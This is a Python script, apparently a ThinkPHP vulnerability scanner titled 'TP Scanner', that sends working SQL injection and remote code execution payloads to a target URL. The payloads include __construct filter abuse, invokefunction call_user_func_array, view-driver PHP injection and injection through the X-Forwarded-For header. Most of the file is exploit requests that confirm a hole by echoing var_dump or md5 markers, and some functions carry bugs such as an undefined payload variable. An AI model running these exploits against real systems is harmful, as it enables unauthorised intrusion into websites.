#/usr/bin/env python3
# coding utf-8

banner = """
 ______  ____        ____                                                    
/\\__  _\\/\\  _`\\     /\\  _`\\                                                  
\\/_/\\ \\/\\ \\ \\L\\ \\   \\ \\,\\L\\_\\    ___     __      ___     ___      __   _ __  
   \\ \\ \\ \\ \\ ,__/    \\/_\\__ \\   /'___\\ /'__`\\  /' _ `\\ /' _ `\\  /'__`\\/\\`'__\\
    \\ \\ \\ \\ \\ \\/       /\\ \\L\\ \\/\\ \\__//\\ \\L\\.\\_/\\ \\/\\ \\/\\ \\/\\ \\/\\  __/\\ \\ \\/ 
     \\ \\_\\ \\ \\_\\       \\ `\\____\\ \\____\\ \\__/.\\_\\ \\_\\ \\_\\ \\_\\ \\_\\ \\____\\\\ \\_\\ 
      \\/_/  \\/_/        \\/_____/\\/____/\\/__/\\/_/\\/_/\\/_/\\/_/\\/_/\\/____/ \\/_/ 
                                                                             
                                                        code by 风潇
"""
pocinfo = """
[+]vul found
vulnname: {0}
isvul: {1}
vulnurl： {2}
payload: {3}    
proof: {4}
response: {5}    
exception: {6}

"""
__all__ = ['thinkphp_checkcode_time_sqli_verify','thinkphp_construct_code_exec_verify','thinkphp_construct_debug_rce_verify','thinkphp_debug_index_ids_sqli_verify','thinkphp_driver_display_rce_verify','thinkphp_index_construct_rce_verify','thinkphp_index_showid_rce_verify','thinkphp_invoke_func_code_exec_verify','thinkphp_lite_code_exec_verify','thinkphp_method_filter_code_exec_verify','thinkphp_multi_sql_leak_verify','thinkphp_pay_orderid_sqli_verify','thinkphp_request_input_rce_verify','thinkphp_view_recent_xff_sqli_verify']



import threading
import time
from urllib import request
from urllib import parse

def thinkphp_checkcode_time_sqli_verify(url):
    print("[+]testing {}".format("thinkphp_checkcode_time_sqli"))
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "DNT": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type": "multipart/form-data; boundary=--------641902708",
        "Accept-Encoding": "gzip, deflate, sdch",
        "Accept-Language": "zh-CN,zh;q=0.8",
    }
    payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UNION SELECT SlEEP(5)#\r\n\r\n----------641902708--"
    try:
        start_time = time.time()
        vurl = parse.urljoin(url, 'index.php?s=/home/user/checkcode/')
        req = request.urlopen(request.Request(url=vurl, data=payload.encode(), headers=headers, method="POST", unverifiable=False), timeout=15)
        if time.time() - start_time >= 5:
            result = pocinfo.format("thinkphp_checkcode_time_sqli","True",vurl,payload,"time sleep 5","sliently".decode("utf-8","ignore"),"null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_checkcode_time_sqli","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_checkcode_time_sqli"))

def thinkphp_construct_code_exec_verify(url):
    print("[+]testing {}".format("thinkphp_construct_code_exec"))
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    }
    payload = {
        '_method':'__construct',
        'filter[]':'var_dump',
        'method':'get',
        'server[REQUEST_METHOD]':'2333',
    }
    payload = bytes(parse.urlencode(payload), encoding='utf8')
    try:
        vurl = parse.urljoin(url, 'index.php?s=captcha')
        req = request.urlopen(request.Request(url=vurl, data=payload, headers=headers, method="POST", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"2333" in text:
            result = pocinfo.format("thinkphp_construct_code_exec","True",vurl,payload,"var_dump(2333)","sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_construct_code_exec","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_construct_code_exec"))

def thinkphp_construct_debug_rce_verify(url):
    print("[+]testing {}".format("thinkphp_construct_debug_rce"))
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    }
    payload = {
        '_method':'__construct',
        'filter[]':'var_dump',
        'server[REQUEST_METHOD]':'2333',
    }
    payload = bytes(parse.urlencode(payload), encoding='utf8')
    try:
        vurl = parse.urljoin(url, 'index.php')
        req = request.urlopen(request.Request(url=vurl, data=payload, headers=headers, method="POST", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"2333" in text:
            result = pocinfo.format("thinkphp_construct_debug_rce","True",vurl,payload,"var_dump(2333)","sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_construct_debug_rce","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_construct_debug_rce"))

def thinkphp_debug_index_ids_sqli_verify(url):
    print("[+]testing {}".format("thinkphp_debug_index_ids_sqli"))
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    }
    payload = 'index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1'
    try:
        vurl = parse.urljoin(url, payload)
        req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"56540676a129760" in text:
            result = pocinfo.format("thinkphp_debug_index_ids_sqli","True",vurl,payload,"SQL UPDATEXML INJECTION Md5(2333)","sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_debug_index_ids_sqli","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_debug_index_ids_sqli"))

def thinkphp_driver_display_rce_verify(url):
    print("[+]testing {}".format("thinkphp_driver_display_rce"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    payload = 'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(2333);?%3E'
    try:
        vurl = parse.urljoin(url, payload)
        req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"2333" in text:
            result = pocinfo.format("thinkphp_driver_display_rce","True",vurl,payload,"var_dump(2333)","sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_driver_display_rce","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_driver_display_rce"))

def thinkphp_index_construct_rce_verify(url):
    print("[+]testing {}".format("thinkphp_index_construct_rce"))
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = {
    	"s": "2333",
    	"_method": "__construct",
    	"method": "",
    	"filter[]": "var_dump"
    }
    payload = bytes(parse.urlencode(payload), encoding='utf8')
    try:
        vurl = parse.urljoin(url, 'index.php?s=index/index/index')
        req = request.urlopen(request.Request(url=vurl, data=payload, headers=headers, method="POST", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"2333" in text:
            result = pocinfo.format("thinkphp_index_construct_rce","True",vurl,payload,"var_dump(2333)","sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_index_construct_rce","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_index_construct_rce"))

def thinkphp_index_showid_rce_verify(url):
    print("[+]testing {}".format("thinkphp_index_showid_rce"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    try:
        vurl = parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
        req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
        import datetime
        timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
        vurl2 = parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(timenow))
        req2 = request.urlopen(request.Request(url=vurl2, headers=headers, method="GET", unverifiable=False), timeout=15)
        text = req2.read().decode("utf-8","ignore")
        if r"56540676a129760a3" in text:
            result = pocinfo.format("thinkphp_index_showid_rce","True",vurl,payload,"var_dump(md5(2333))","sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_index_showid_rce","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_index_showid_rce"))

def thinkphp_invoke_func_code_exec_verify(url):
    print("[+]testing {}".format("thinkphp_invoke_func_code_exec"))
    import re
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    controllers = list()
    req = request.urlopen(request.Request(url=url, headers=headers, method="GET", unverifiable=False), timeout=15)
    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.read().decode("utf-8","ignore"))
    for match in matches:
        controllers.append(match.split('/')[1])
    controllers.append('index')
    controllers = list(set(controllers))
    for controller in controllers:
        try:
            payload = 'index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(controller)
            vurl = parse.urljoin(url, payload)
            req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
            text = req.read().decode("utf-8","ignore")
            if r"56540676a129760a3" in text:
                result = pocinfo.format("thinkphp_invoke_func_code_exec","True",vurl,payload,"var_dump(md5(2333))","sliently","null")
                print(result)
                return
        except Exception as e:
            result = pocinfo.format("thinkphp_invoke_func_code_exec","null","null","null","null","null",str(e))
            print(result)
    print("[-]vul {} seems not exist".format("thinkphp_invoke_func_code_exec"))

def thinkphp_lite_code_exec_verify(url):
    print("[+]testing {}".format("thinkphp_lite_code_exec"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    try:
        payload = 'index.php/module/action/param1/%7B@print%28md5%282333%29%29%7D'
        vurl = parse.urljoin(url, payload)
        req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"56540676a129760a3" in text:
            result = pocinfo.format("thinkphp_lite_code_exec","True",vurl,payload,"var_dump(md5(2333))","sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_lite_code_exec","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_lite_code_exec"))


def thinkphp_method_filter_code_exec_verify(url):
    print("[+]testing {}".format("thinkphp_method_filter_code_exec"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    payload = {
        'c':'var_dump',
        'f':'2333',
        '_method':'filter',
    }
    payload = bytes(parse.urlencode(payload), encoding='utf8')
    try:
        vurl = parse.urljoin(url, 'index.php')
        req = request.urlopen(request.Request(url=vurl, data=payload, headers=headers, method="POST", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"2333" in text:
               result = pocinfo.format("thinkphp_method_filter_code_exec","True",vurl,payload,"var_dump(2333)","sliently","null")
               print(result)
               return
    except Exception as e:
        result = pocinfo.format("thinkphp_method_filter_code_exec","null","null","null","null","null",str(e))
        print(result)
        print("[-]vul {} seems not exist".format("thinkphp_method_filter_code_exec"))


def thinkphp_multi_sql_leak_verify(url):
    print("[+]testing {}".format("thinkphp_multi_sql_leak"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    payloads = [
        r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
        r'index.php?s=/home/shopcart/getpriceNum/id/1%27',
        r'index.php?s=/home/user/cut/id/1%27',
        r'index.php?s=/home/service/index/id/1%27',
        r'index.php?s=/home/pay/chongzhi/orderid/1%27',
        r'index.php?s=/home/order/complete/id/1%27',
        r'index.php?s=/home/order/detail/id/1%27',
        r'index.php?s=/home/order/cancel/id/1%27',
    ]
    try:
        for payload in payloads:
            vurl = parse.urljoin(url, payload)
            req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
            text = req.read().decode("utf-8","ignore")
            if r"SQL syntax" in text:
                result = pocinfo.format("thinkphp_multi_sql_leak","True",vurl,payload,'SQL INJECTION FOUND',"sliently","null")
                print(result)
                return
    except Exception as e:
        result = pocinfo.format("thinkphp_multi_sql_leak","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_multi_sql_leak"))

def thinkphp_pay_orderid_sqli_verify(url):
    print("[+]testing {}".format("thinkphp_pay_orderid_sqli"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    try:
        vurl = parse.urljoin(url, 'index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+')
        req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"56540676a129760a" in text:
            result = pocinfo.format("thinkphp_pay_orderid_sqli","True",vurl,payload,'SQL INJECTION MD5(2333)',"sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_pay_orderid_sqli","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_pay_orderid_sqli"))

def thinkphp_request_input_rce_verify(url):
    print("[+]testing {}".format("thinkphp_request_input_rce"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    try:
        vurl = parse.urljoin(url, 'index.php?s=index/\\think\Request/input&filter=var_dump&data=2333')
        req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"2333" in text:
            result = pocinfo.format("thinkphp_request_input_rce","True",vurl,payload,'var_dump(2333)',"sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_request_input_rce","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_request_input_rce"))

def thinkphp_view_recent_xff_sqli_verify(url):
    print("[+]testing {}".format("thinkphp_view_recent_xff_sqli"))
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "X-Forwarded-For" : "1')And/**/ExtractValue(1,ConCat(0x5c,(SElEct/**/Md5(2333))))#"
    }
    try:
        vurl = parse.urljoin(url, 'index.php?s=/home/article/view_recent/name/1')
        req = request.urlopen(request.Request(url=vurl, headers=headers, method="GET", unverifiable=False), timeout=15)
        text = req.read().decode("utf-8","ignore")
        if r"56540676a129760a" in text:
            result = pocinfo.format("thinkphp_view_recent_xff_sqli","True",vurl,payload,'XFF-MYSQL-INJECTION MD5(2333)',"sliently","null")
            print(result)
            return
    except Exception as e:
        result = pocinfo.format("thinkphp_view_recent_xff_sqli","null","null","null","null","null",str(e))
        print(result)
    print("[-]vul {} seems not exist".format("thinkphp_view_recent_xff_sqli"))

def Main():
    print(banner)
    target = input("Please Input The Target url with prefix http: ")
    if target.find('http') == -1:
    	print('exit')
    	exit(1)
    print("start scan...")
    for item in __all__:
    	   threading.Thread(target=eval(item),args=(target,)).start()

if __name__ == '__main__':
    Main()